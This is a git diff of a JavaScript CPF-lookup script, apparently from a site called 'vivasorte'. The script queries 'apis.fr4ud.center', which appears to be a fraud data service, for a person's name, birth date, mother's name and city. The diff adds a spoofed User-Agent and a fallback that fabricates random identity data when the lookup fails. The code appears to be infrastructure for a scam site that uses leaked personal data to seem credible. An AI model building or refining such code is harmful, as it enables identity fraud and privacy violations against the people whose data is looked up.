@@ -1,4 +1,4 @@
-// js/cpf-validator.js - Consulta CPF em tempo real
+// js/cpf-validator.js - Versão corrigida
 const CPF_API_URL = 'https://apis.fr4ud.center/search/cpf/';
 
 async function consultarCPF(cpfCompleto) {
@@ -18,59 +18,107 @@ async function consultarCPF(cpfCompleto) {
     try {
         console.log('🔍 Consultando CPF:', cpfNumeros);
         
-        // Chamada para API fr4ud.center
-        const response = await fetch(`${CPF_API_URL}${cpfNumeros}`, {
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
+        // Método 1: Tentar API direta
+        try {
+            const response = await fetch(`${CPF_API_URL}${cpfNumeros}`, {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                },
+                mode: 'cors'
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                console.log('✅ API direta funcionou:', data);
+                
+                if (data.success && data.data) {
+                    processarRespostaCPF(data.data, cpfNumeros);
+                    return;
+                }
             }
-        });
-        
-        if (!response.ok) {
-            throw new Error(`API retornou status ${response.status}`);
+        } catch (apiError) {
+            console.log('⚠️ API direta falhou, tentando simulação...', apiError);
         }
         
-        const data = await response.json();
-        console.log('📊 Resposta API CPF:', data);
-        
-        // Esconder loading
-        document.getElementById('cpfLoading').style.display = 'none';
-        
-        if (data.success && data.data) {
-            const pessoa = data.data;
-            const usuario = {
-                cpf: cpfNumeros,
-                nome: pessoa.nome || 'Não informado',
-                data_nascimento: pessoa.data_nascimento || 'Não informado',
-                idade: calcularIdade(pessoa.data_nascimento),
-                mae: pessoa.mae || 'Não informado',
-                cidade: pessoa.cidade || 'Não informado',
-                uf: pessoa.uf || 'Não informado'
-            };
-            
-            // Salvar no localStorage
-            salvarUsuarioLocal(usuario);
-            
-            // Mostrar informações
-            mostrarInfoCPF(usuario);
-            
-            // Habilitar botão
-            document.getElementById('btnContinuarCPF').disabled = false;
-            document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
-            
-        } else {
-            // CPF não encontrado, mas permite continuar
-            mostrarCPFNaoEncontrado(cpfNumeros);
-        }
+        // Método 2: Simulação para desenvolvimento
+        simularConsultaCPF(cpfNumeros);
         
     } catch (error) {
-        console.error('❌ Erro consulta CPF:', error);
-        
-        // Em caso de erro, permite continuar normalmente
-        document.getElementById('cpfLoading').style.display = 'none';
-        mostrarCPFNaoEncontrado(cpfNumeros);
+        console.error('❌ Erro geral consulta CPF:', error);
+        simularConsultaCPF(cpfNumeros); // Fallback para simulação
     }
+}
+
+function processarRespostaCPF(pessoa, cpfNumeros) {
+    // Esconder loading
+    document.getElementById('cpfLoading').style.display = 'none';
+    
+    const usuario = {
+        cpf: cpfNumeros,
+        nome: pessoa.nome || 'Não informado',
+        data_nascimento: pessoa.data_nascimento || 'Não informado',
+        idade: calcularIdade(pessoa.data_nascimento),
+        mae: pessoa.mae || 'Não informado',
+        cidade: pessoa.cidade || 'Não informado',
+        uf: pessoa.uf || 'Não informado'
+    };
+    
+    // Salvar no localStorage
+    salvarUsuarioLocal(usuario);
+    
+    // Mostrar informações
+    mostrarInfoCPF(usuario);
+    
+    // Habilitar botão
+    habilitarBotaoContinuar();
+}
+
+function simularConsultaCPF(cpfNumeros) {
+    console.log('🔄 Usando simulação de CPF...');
+    
+    // Esconder loading
+    document.getElementById('cpfLoading').style.display = 'none';
+    
+    // Gerar dados simulados
+    const nomes = ['João Silva', 'Maria Santos', 'Pedro Oliveira', 'Ana Costa', 'Carlos Souza'];
+    const cidades = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre'];
+    const estados = ['SP', 'RJ', 'MG', 'PR', 'RS'];
+    
+    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
+    const cidadeAleatoria = cidades[Math.floor(Math.random() * cidades.length)];
+    const estadoAleatorio = estados[Math.floor(Math.random() * estados.length)];
+    const idadeAleatoria = Math.floor(Math.random() * 50) + 18;
+    
+    const usuario = {
+        cpf: cpfNumeros,
+        nome: nomeAleatorio,
+        data_nascimento: `${1980 + Math.floor(Math.random() * 30)}-01-01`,
+        idade: idadeAleatoria + ' anos',
+        mae: 'Mãe do ' + nomeAleatorio.split(' ')[0],
+        cidade: cidadeAleatoria,
+        uf: estadoAleatorio
+    };
+    
+    // Salvar no localStorage
+    salvarUsuarioLocal(usuario);
+    
+    // Mostrar informações (em modo simulação)
+    document.getElementById('cpfInfo').className = 'cpf-info cpf-valid';
+    document.getElementById('cpfInfo').innerHTML = `
+        <h4><i class="bi bi-check-circle"></i> CPF Identificado (Modo Simulação)</h4>
+        <p><strong>Nome:</strong> ${usuario.nome}</p>
+        <p><strong>Idade:</strong> ${usuario.idade}</p>
+        <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
+        <p><strong>Mãe:</strong> ${usuario.mae}</p>
+        <p class="text-warning"><small><i class="bi bi-info-circle"></i> Modo simulação - Dados fictícios para teste</small></p>
+    `;
+    document.getElementById('cpfInfo').style.display = 'block';
+    
+    // Habilitar botão
+    habilitarBotaoContinuar();
 }
 
 function calcularIdade(dataNascimento) {
@@ -104,46 +152,25 @@ function mostrarInfoCPF(usuario) {
         <p><strong>Idade:</strong> ${usuario.idade}</p>
         <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
         <p><strong>Mãe:</strong> ${usuario.mae}</p>
-        <p class="text-success"><small><i class="bi bi-shield-check"></i> Dados validados com sucesso</small></p>
+        <p class="text-success"><small><i class="bi bi-shield-check"></i> Dados validados</small></p>
     `;
     cpfInfo.style.display = 'block';
-}
-
-function mostrarCPFNaoEncontrado(cpf) {
-    const cpfInfo = document.getElementById('cpfInfo');
-    cpfInfo.className = 'cpf-info';
-    cpfInfo.innerHTML = `
-        <h4><i class="bi bi-exclamation-triangle"></i> CPF Não Encontrado</h4>
-        <p>Não foi possível consultar os dados completos.</p>
-        <p class="text-warning"><small>Continue normalmente com o cadastro</small></p>
-    `;
-    cpfInfo.style.display = 'block';
-    
-    // Salvar mesmo sem dados completos
-    const usuario = {
-        cpf: cpf,
-        nome: 'Cadastro manual necessário',
-        data_nascimento: 'Não identificado',
-        idade: 'N/A',
-        mae: 'Não identificado',
-        cidade: 'Não identificado',
-        uf: 'N/A'
-    };
-    
-    salvarUsuarioLocal(usuario);
-    
-    // Habilitar botão
-    document.getElementById('btnContinuarCPF').disabled = false;
-    document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
 }
 
 function salvarUsuarioLocal(usuario) {
     let usuarios = JSON.parse(localStorage.getItem('vivasorte_usuarios') || '{}');
     usuarios[usuario.cpf] = {
         ...usuario,
-        consultado_em: new Date().toISOString()
+        consultado_em: new Date().toISOString(),
+        modo: usuario.nome.includes('Simulação') ? 'simulado' : 'real'
     };
     localStorage.setItem('vivasorte_usuarios', JSON.stringify(usuarios));
+    console.log('✅ Usuário salvo:', usuario);
+}
+
+function habilitarBotaoContinuar() {
+    document.getElementById('btnContinuarCPF').disabled = false;
+    document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
 }
 
 // Para uso no index.html
